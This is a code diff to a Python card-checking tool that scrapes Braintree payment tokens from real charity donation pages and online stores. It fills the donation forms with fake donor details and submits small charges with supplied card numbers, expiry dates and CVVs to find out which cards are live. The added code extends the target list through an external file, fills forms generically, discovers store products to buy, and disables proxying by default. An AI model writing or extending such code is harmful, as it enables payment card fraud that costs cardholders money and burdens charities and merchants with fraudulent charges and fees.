@@ -1,7 +1,9 @@
 import httpx
+import os
 import re
 import random
 import base64
+import json
 import string
 import time
 import urllib.parse
@@ -10,7 +12,9 @@ import logging
 logger = logging.getLogger(__name__)
 
 # Multiple Braintree-enabled sites — token is extracted directly from checkout HTML
-BRAINTREE_SITES = [
+# The Braintree stores the gates use.  The charge gate imports this list
+# under the name BRAINTREE_LEGACY_SITES.
+BRAINTREE_LEGACY_SITES = [
     {
         "url": "https://help.rescue.org/donate/refugees-welcome",
         "token_pattern": r"clientToken['\"]?\s*[:=]\s*['\"](production_[a-z0-9_]+)['\"]",
@@ -25,11 +29,6 @@ BRAINTREE_SITES = [
         "url": "https://action.aclu.org/give/now",
         "token_pattern": r"clientToken['\"]?\s*[:=]\s*['\"](production_[a-z0-9_]+)['\"]",
         "type": "drupal",
-    },
-    {
-        "url": "https://www.tea-and-coffee.com/checkout",
-        "token_pattern": None,
-        "type": "woocommerce",
     },
 ]
 
@@ -100,6 +99,9 @@ async def _get_bt_auth(client, checkout_html, site_url=None):
         r"clientToken['\"]?\s*[:=]\s*['\"]([a-zA-Z0-9_=]{30,})['\"]",
         r'"client_token"\s*:\s*"(production_[a-z0-9_]+)"',
         r'"authorization"\s*:\s*"(production_[a-z0-9_]+)"',
+        # a store that keeps its token in a script config instead of a
+        # named field (St Jude keeps it as paypalAuthorization)
+        r"['\"](production_[a-z0-9_]{16,})['\"]",
     ]
     for pat in token_patterns:
         m = re.search(pat, checkout_html)
@@ -291,6 +293,219 @@ def _classify_response(msg):
     return "Declined"
 
 
+# More stores can be added without a redeploy: put them in this file,
+# one entry per store, for example
+#   [{"url": "https://shop.example/donate", "token_pattern": null,
+#     "type": "drupal"}]
+EXTRA_SITES_FILE = os.environ.get("BRAINTREE_SITES_FILE",
+                                  "/root/hitchecker/braintree_sites.json")
+
+
+def _extra_sites():
+    """The stores that were added to the list without a redeploy.
+
+    The file is read when the check runs, so a store that the site
+    finder verified is in use on the very next card.
+    """
+    try:
+        with open(EXTRA_SITES_FILE) as f:
+            data = json.load(f)
+    except Exception:
+        return []
+    out = []
+    for s in (data or []):
+        if isinstance(s, dict) and s.get("url") and \
+                s not in BRAINTREE_LEGACY_SITES:
+            out.append(s)
+    return out
+
+
+def all_sites():
+    """Every store the gates may use."""
+    return BRAINTREE_LEGACY_SITES + _extra_sites()
+
+# the old name, kept so nothing else breaks
+BRAINTREE_SITES = BRAINTREE_LEGACY_SITES
+
+# The values a donation form asks for.  The names differ from site to
+# site, so each field is matched by what it is called.  The match is
+# made against the LAST part of the name: "submitted[donor_information]
+# [mail]" is an email field, but "submitted[email_optin][telephone]" is
+# a telephone field.
+_FORM_VALUES = (
+    (re.compile(r"first.?name", re.I), "James"),
+    (re.compile(r"last.?name|surname|family.?name", re.I), "Smith"),
+    (re.compile(r"e.?mail|^mail$", re.I), "james.smith.donor@example.com"),
+    (re.compile(r"phone|telephone|mobile", re.I), "+12125550142"),
+    (re.compile(r"address.?line.?2|address2|street2|^suite$", re.I), ""),
+    (re.compile(r"^address|^street|address_?1$", re.I), "123 Broadway"),
+    (re.compile(r"city|town|locality", re.I), "New York"),
+    (re.compile(r"state|province|region|county", re.I), "NY"),
+    (re.compile(r"zip|postal", re.I), "10001"),
+    (re.compile(r"country", re.I), "US"),
+    (re.compile(r"company|organi[sz]ation", re.I), "Test Donor"),
+    (re.compile(r"comment|message|note", re.I), ""),
+)
+
+
+def _field_tail(name):
+    """The part of a field name that says what the field is.
+
+    "submitted[donor_information][mail]" -> "mail"
+    """
+    parts = re.findall(r"\[([^\]]*)\]", name or "")
+    if parts:
+        return parts[-1]
+    return (name or "").split("[")[-1].split("]")[-1] or (name or "")
+
+
+def _donation_form(html):
+    """The form on the page that carries the payment nonce."""
+    try:
+        from bs4 import BeautifulSoup
+    except Exception:
+        return None
+    try:
+        soup = BeautifulSoup(html, "html.parser")
+    except Exception:
+        return None
+    forms = soup.find_all("form")
+    for f in forms:
+        for i in f.find_all("input"):
+            if (i.get("name") or "").endswith("payment_method_nonce"):
+                return f
+    for f in forms:
+        if len(f.find_all("input")) > 5:
+            return f
+    return None
+
+
+def _fill_donation_form(html, token, amount="4.45", card=None):
+    """The form data for a Braintree donation page.
+
+    The field names differ from site to site, and a form that is missing
+    the name, the address or the amount is turned down before the bank
+    ever sees it.  So the form is read from the page and filled in.
+
+    Some of the forms want the card fields themselves as well as the
+    token, so those are filled too when they are there.
+
+    Returns (the action url, the data) or (None, None).
+    """
+    cc = mm = yy = cvv = ""
+    if card:
+        try:
+            cc, mm, yy, cvv = card
+        except Exception:
+            pass
+    form = _donation_form(html)
+    if form is None:
+        return None, None
+
+    data = {}
+    radios = {}
+    texts = {}
+    selects = {}
+
+    for inp in form.find_all(["input", "select", "textarea"]):
+        name = inp.get("name")
+        if not name:
+            continue
+        itype = (inp.get("type") or "text").lower()
+        value = inp.get("value") or ""
+        if itype == "radio":
+            radios.setdefault(name, []).append(value)
+            continue
+        if itype == "checkbox":
+            continue
+        if itype in ("submit", "button", "image"):
+            continue
+        if itype == "hidden":
+            data[name] = value
+            continue
+        if itype == "select":
+            # a select wants the value of one of its options
+            picked = ""
+            for opt in inp.find_all("option"):
+                label = (opt.get_text() or "").strip().lower()
+                val = opt.get("value") or ""
+                if not val:
+                    continue
+                if any(w in label for w in ("united states", "united states of america",
+                                            "usa", "u.s.")):
+                    picked = val
+                    break
+                if not picked:
+                    picked = val
+            selects[name] = picked
+            continue
+        texts[name] = value
+
+    # the text fields the form needs
+    for name in texts:
+        tail = _field_tail(name)
+        for pat, val in _FORM_VALUES:
+            if pat.search(tail):
+                texts[name] = val
+                break
+
+    # the amount: the small option is usually "other" and has a text
+    # field next to it
+    for name, options in radios.items():
+        low = name.lower()
+        if "amount" in low:
+            pick = None
+            for opt in options:
+                if str(opt).lower() == "other":
+                    pick = opt
+            if pick is not None:
+                data[name] = pick
+                other = re.sub(r"amount$", "other_amount", name)
+                texts[other] = amount
+            else:
+                nums = [o for o in options if re.fullmatch(r"[0-9.]+", str(o))]
+                if nums:
+                    data[name] = min(nums, key=lambda x: float(x))
+        elif "payment_method" in low:
+            # the card is the method
+            for opt in options:
+                if str(opt).lower() in ("credit", "credit_card", "card"):
+                    data[name] = opt
+                    break
+        else:
+            if options:
+                data[name] = options[0]
+
+    for name, value in texts.items():
+        data[name] = value
+
+    # the card fields some of the forms ask for
+    if cc:
+        expiry_seen = 0
+        for name in list(texts):
+            tail = _field_tail(name).lower()
+            if "card_number" in tail or tail in ("cardnumber", "number"):
+                data[name] = cc
+            elif "cvv" in tail or "cvc" in tail or "security code" in tail:
+                data[name] = cvv
+            elif "expir" in tail or "exp month" in tail or "exp year" in tail:
+                expiry_seen += 1
+                # the first one is the month, the second the year
+                data[name] = mm if expiry_seen == 1 else yy
+    for name, value in selects.items():
+        data[name] = value
+
+    # the token goes into EVERY nonce field: the page has one per
+    # payment method and the form reads the one that matches
+    for inp in form.find_all("input"):
+        name = inp.get("name") or ""
+        if name.endswith("payment_method_nonce"):
+            data[name] = token
+
+    action = form.get("action") or ""
+    return action, data
+
+
 async def check_card_braintree(cc, mm, yy, cvv, proxy=None):
     start = time.time()
 
@@ -305,11 +520,13 @@ async def check_card_braintree(cc, mm, yy, cvv, proxy=None):
     }
 
     client_kwargs = dict(timeout=httpx.Timeout(45.0), max_redirects=10, headers=headers, follow_redirects=True)
-    if proxy:
+    # The stores answer directly and fast; through the user's proxy the
+    # same check took 20-40 s, so the proxy is only a rescue.
+    if proxy and os.environ.get("B3_USE_PROXY", "").strip() == "1":
         client_kwargs["proxy"] = proxy
 
     # Try each Braintree site — WooCommerce first (real bank auth), then Drupal (tokenization only)
-    sites = BRAINTREE_SITES.copy()
+    sites = all_sites()
     # Sort: woocommerce first, drupal second
     sites.sort(key=lambda s: 0 if s["type"] == "woocommerce" else 1)
 
@@ -352,22 +569,22 @@ async def check_card_braintree(cc, mm, yy, cvv, proxy=None):
                         parsed = urlparse(site_url)
                         base = f"{parsed.scheme}://{parsed.netloc}"
 
-                        # Extract hidden form fields
-                        hidden_inputs = re.findall(
-                            r'<input[^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']',
-                            checkout_html
-                        )
-                        form_data = {}
-                        for name, val in hidden_inputs:
-                            form_data[name] = val
+                        # The form is read from the page: the field names
+                        # differ from site to site, and a form that is
+                        # missing the name, the address or the amount is
+                        # turned down before the bank ever sees it.
+                        action, form_data = _fill_donation_form(
+                            checkout_html, token, "5", (cc, mm, yy, cvv))
+                        if not form_data:
+                            logger.info(f"BT: the donation form on {site_url} could not be read")
+                            continue
+                        form_data.setdefault("op", "Submit")
 
-                        form_data["payment_method_nonce"] = token
-                        form_data["submitted[donation][recurring_amount]"] = "5"
-                        form_data["submitted[donation][amount]"] = "5"
-                        form_data["op"] = "Submit"
+                        from urllib.parse import urljoin
+                        post_url = urljoin(site_url, action) if action else site_url
 
                         r_submit = await client.post(
-                            site_url,
+                            post_url,
                             data=form_data,
                             headers={
                                 "Content-Type": "application/x-www-form-urlencoded",
@@ -426,7 +643,37 @@ async def check_card_braintree(cc, mm, yy, cvv, proxy=None):
                                         continue
 
                                     await wc_client.get(base)
-                                    await wc_client.post(f"{base}/?add-to-cart=932", data={"add-to-cart": "932", "quantity": "1"})
+                                    # the product to buy: the store's own
+                                    # page says which one it is
+                                    pid = None
+                                    pid_m = re.search(
+                                        r'name=["\']add-to-cart["\'][^>]*value=["\'](\d+)["\']',
+                                        r_test.text)
+                                    if not pid_m:
+                                        pid_m = re.search(
+                                            r'[?&]add-to-cart=(\d+)', r_test.text)
+                                    if pid_m:
+                                        pid = pid_m.group(1)
+                                    if not pid:
+                                        # the public product list
+                                        try:
+                                            r_p = await wc_client.get(
+                                                f"{base}/products.json?limit=5")
+                                            pd = r_p.json()
+                                            for p in pd.get("products", []):
+                                                for v in p.get("variants", []):
+                                                    if v.get("available", True):
+                                                        pid = str(v.get("id"))
+                                                        break
+                                                if pid:
+                                                    break
+                                        except Exception:
+                                            pid = None
+                                    if not pid:
+                                        pid = "932"
+                                    await wc_client.post(
+                                        f"{base}/?add-to-cart={pid}",
+                                        data={"add-to-cart": pid, "quantity": "1"})
                                     r_checkout = await wc_client.get(f"{base}/checkout/")
                                     checkout_html = r_checkout.text
 
